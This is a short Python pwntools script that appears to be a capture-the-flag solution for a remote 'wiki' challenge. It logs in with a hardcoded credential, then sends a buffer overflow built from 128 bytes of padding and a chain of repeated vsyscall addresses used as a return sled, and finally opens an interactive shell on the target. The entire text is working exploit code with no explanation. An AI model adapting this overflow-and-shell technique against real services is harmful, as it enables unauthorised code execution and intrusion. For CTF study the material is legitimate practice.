#!/usr/bin/python
from pwn import *
import sys, time

if sys.argv[1] != 'remote':
    p = process("./challenge")
else:
    p = remote("wiki.ctfcompetition.com",1337)

p.sendline("USER")
p.sendline("xmlset_roodkcableoj28840ybtide")
p.sendline("PASS")

payload = 'A' + 'a'*127
payload += p64(0xffffffffff600000)
payload += p64(0xffffffffff600000)
payload += p64(0xffffffffff600000)
payload += p64(0xffffffffff600000)###RET
payload += p64(0xffffffffff600000)*23

t = int(time.time())
p.sendline(payload)
p.sendline(p64(t))

p.interactive()
p.close()

